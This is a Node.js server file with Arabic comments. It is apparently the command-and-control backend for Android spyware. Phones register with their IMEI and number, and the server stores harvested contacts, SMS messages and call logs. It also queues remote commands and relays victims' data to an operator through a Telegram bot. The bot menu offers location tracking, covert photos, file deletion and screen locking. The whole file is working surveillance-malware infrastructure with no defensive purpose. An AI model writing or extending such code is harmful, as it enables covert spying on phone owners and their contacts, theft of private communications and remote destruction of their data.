const express = require('express');
const { createClient } = require('@supabase/supabase-js');
const axios = require('axios');
require('dotenv').config();

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// إعداد Supabase
const supabase = createClient(
  process.env.SUPABASE_URL,
  process.env.SUPABASE_SERVICE_KEY
);

const TELEGRAM_API = 'https://api.telegram.org/bot' + process.env.TELEGRAM_BOT_TOKEN;
const ADMIN_ID = process.env.TELEGRAM_ADMIN_ID;

// ==================== API Endpoints ====================

// 1. تسجيل جهاز جديد
app.post('/api/devices/register', async (req, res) => {
  try {
    const { device_id, model, android_version, imei, phone_number } = req.body;

    const { data, error } = await supabase
      .from('devices')
      .upsert({
        device_id,
        model,
        android_version,
        imei,
        phone_number,
        last_seen: new Date(),
        is_active: true
      })
      .select();

    if (error) throw error;

    // إرسال تنبيه للمشرف
    await sendTelegramAlert(
      `✅ جهاز جديد متصل!\n\nالطراز: ${model}\nالإصدار: ${android_version}\nIMEI: ${imei}`
    );

    res.json({ status: 'ok', device: data[0] });
  } catch (err) {
    console.error('Register error:', err);
    res.status(500).json({ error: err.message });
  }
});

// 2. جلب الأوامر المعلقة
app.get('/api/commands/:device_id', async (req, res) => {
  try {
    const { device_id } = req.params;

    const { data: commands, error } = await supabase
      .from('commands')
      .select('*')
      .eq('device_id', device_id)
      .eq('status', 'pending')
      .order('created_at', { ascending: true });

    if (error) throw error;

    res.json(commands || []);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// 3. حفظ بيانات الجهاز (جهات الاتصال، الرسائل، إلخ)
app.post('/api/data/log', async (req, res) => {
  try {
    const { device_id, data_type, data } = req.body;

    const { error } = await supabase
      .from('data_logs')
      .insert({
        device_id,
        data_type,
        data,
        timestamp: new Date()
      });

    if (error) throw error;

    // حفظ البيانات المهمة في جداول منفصلة حسب النوع
    if (data_type === 'contacts' && Array.isArray(data)) {
      await supabase.from('contacts').insert(
        data.map(contact => ({
          device_id,
          name: contact.name,
          phone: contact.phone,
          email: contact.email || null,
          timestamp: new Date()
        }))
      );
    }

    if (data_type === 'messages' && Array.isArray(data)) {
      await supabase.from('messages').insert(
        data.map(msg => ({
          device_id,
          sender: msg.from,
          body: msg.message,
          type: msg.type,
          timestamp: new Date()
        }))
      );
    }

    if (data_type === 'call_logs' && Array.isArray(data)) {
      await supabase.from('call_logs').insert(
        data.map(call => ({
          device_id,
          number: call.number,
          duration: call.duration,
          call_type: call.type,
          timestamp: new Date()
        }))
      );
    }

    res.json({ status: 'ok' });
  } catch (err) {
    console.error('Data log error:', err);
    res.status(500).json({ error: err.message });
  }
});

// 4. تحديث حالة الأمر
app.post('/api/commands/:command_id/update', async (req, res) => {
  try {
    const { command_id } = req.params;
    const { status, result } = req.body;

    const { error } = await supabase
      .from('commands')
      .update({
        status,
        result,
        executed_at: new Date(),
        response_time: Date.now()
      })
      .eq('id', command_id);

    if (error) throw error;

    res.json({ status: 'ok' });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// 5. إرسال أمر جديد لجهاز
app.post('/api/commands/send', async (req, res) => {
  try {
    const { device_id, command_type, command_data } = req.body;

    const { data, error } = await supabase
      .from('commands')
      .insert({
        device_id,
        command_type,
        command_data,
        status: 'pending',
        created_at: new Date()
      })
      .select();

    if (error) throw error;

    res.json({ status: 'ok', command: data[0] });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// 6. جلب قائمة الأجهزة النشطة
app.get('/api/devices', async (req, res) => {
  try {
    const { data: devices, error } = await supabase
      .from('devices')
      .select('*')
      .eq('is_active', true)
      .order('last_seen', { ascending: false });

    if (error) throw error;

    res.json(devices || []);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// 7. Telegram Webhook
app.post('/api/telegram/webhook', async (req, res) => {
  try {
    const { message } = req.body;
    if (!message || !message.text) return res.json({ ok: true });

    const text = message.text;
    const chat_id = message.chat.id;
    const user_id = message.from.id;

    // التحقق من أن المستخدم هو المشرف
    if (user_id.toString() !== ADMIN_ID) {
      await sendTelegram(chat_id, '❌ أنت غير مصرح');
      return res.json({ ok: true });
    }

    // معالجة الأوامر
    if (text === '/start' || text === '/help') {
      await handleStartCommand(chat_id);
    } else if (text === '/devices') {
      await handleDevicesCommand(chat_id);
    } else if (text.startsWith('/select_device')) {
      const parts = text.split('_');
      const device_id = parts[2];
      await handleSelectDevice(chat_id, device_id);
    } else if (text === '/contacts') {
      await handleContactsCommand(chat_id);
    } else if (text === '/messages') {
      await handleMessagesCommand(chat_id);
    }

    res.json({ ok: true });
  } catch (err) {
    console.error('Telegram webhook error:', err);
    res.json({ ok: true });
  }
});

// ==================== Helper Functions ====================

async function sendTelegram(chat_id, message) {
  try {
    await axios.post(`${TELEGRAM_API}/sendMessage`, {
      chat_id,
      text: message,
      parse_mode: 'HTML'
    });
  } catch (err) {
    console.error('Send telegram error:', err);
  }
}

async function sendTelegramAlert(message) {
  await sendTelegram(ADMIN_ID, message);
}

async function handleStartCommand(chat_id) {
  const message = `
🤖 <b>مرحباً بك في نظام التحكم</b>

الأوامر المتاحة:
/devices - عرض الأجهزة المتصلة
/contacts - جهات الاتصال
/messages - الرسائل
/call_logs - سجل المكالمات
/photos - الصور

اختر أمراً من الأعلى
`;
  await sendTelegram(chat_id, message);
}

async function handleDevicesCommand(chat_id) {
  const { data: devices } = await supabase
    .from('devices')
    .select('*')
    .eq('is_active', true);

  if (!devices || devices.length === 0) {
    await sendTelegram(chat_id, '❌ لا توجد أجهزة متصلة');
    return;
  }

  let message = '📱 <b>الأجهزة المتصلة:</b>\n\n';
  devices.forEach((device, i) => {
    const lastSeen = new Date(device.last_seen);
    const now = new Date();
    const diff = Math.floor((now - lastSeen) / 1000);

    let status = '🟢 متصل';
    if (diff > 300) status = '🟡 خامل';
    if (diff > 3600) status = '🔴 غير متصل';

    message += `${i + 1}. ${device.model}\n`;
    message += `   الإصدار: Android ${device.android_version}\n`;
    message += `   الحالة: ${status}\n`;
    message += `   IMEI: ${device.imei}\n\n`;
  });

  await sendTelegram(chat_id, message);
}

async function handleSelectDevice(chat_id, device_id) {
  const { data: device } = await supabase
    .from('devices')
    .select('*')
    .eq('device_id', device_id)
    .single();

  if (!device) {
    await sendTelegram(chat_id, '❌ الجهاز غير موجود');
    return;
  }

  const message = `
✅ <b>تم اختيار الجهاز</b>

الطراز: ${device.model}
الإصدار: Android ${device.android_version}
IMEI: ${device.imei}
الهاتف: ${device.phone_number}
البطارية: ${device.battery_level}%

الأوامر:
/get_contacts - جهات الاتصال
/get_messages - الرسائل
/get_location - الموقع
/take_photo - التقط صورة
/delete_files - حذف ملفات
/lock_screen - قفل الشاشة
`;

  await sendTelegram(chat_id, message);
}

async function handleContactsCommand(chat_id) {
  const { data: contacts } = await supabase
    .from('contacts')
    .select('*')
    .limit(50);

  if (!contacts || contacts.length === 0) {
    await sendTelegram(chat_id, '❌ لا توجد جهات اتصال');
    return;
  }

  let message = `📋 <b>جهات الاتصال (${contacts.length})</b>\n\n`;
  contacts.forEach((contact, i) => {
    message += `${i + 1}. ${contact.name} - ${contact.phone}\n`;
  });

  if (message.length > 4000) {
    message = message.substring(0, 3900) + '\n...';
  }

  await sendTelegram(chat_id, message);
}

async function handleMessagesCommand(chat_id) {
  const { data: messages } = await supabase
    .from('messages')
    .select('*')
    .limit(50)
    .order('timestamp', { ascending: false });

  if (!messages || messages.length === 0) {
    await sendTelegram(chat_id, '❌ لا توجد رسائل');
    return;
  }

  let message = `💬 <b>الرسائل (${messages.length})</b>\n\n`;
  messages.forEach((msg, i) => {
    message += `${i + 1}. من: ${msg.sender}\n`;
    message += `   ${msg.body.substring(0, 50)}...\n\n`;
  });

  if (message.length > 4000) {
    message = message.substring(0, 3900) + '\n...';
  }

  await sendTelegram(chat_id, message);
}

// ==================== Start Server ====================

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`Telegram: https://t.me/${process.env.TELEGRAM_BOT_TOKEN.split(':')[0]}`);
});
